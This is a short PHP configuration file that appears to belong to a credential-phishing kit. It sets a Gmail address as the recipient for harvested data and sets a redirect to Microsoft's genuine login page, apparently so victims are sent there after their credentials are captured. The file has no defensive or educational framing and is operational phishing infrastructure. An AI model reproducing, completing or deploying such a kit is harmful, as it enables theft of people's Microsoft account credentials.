<?php 
$Receive_email="Kingalexchris@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>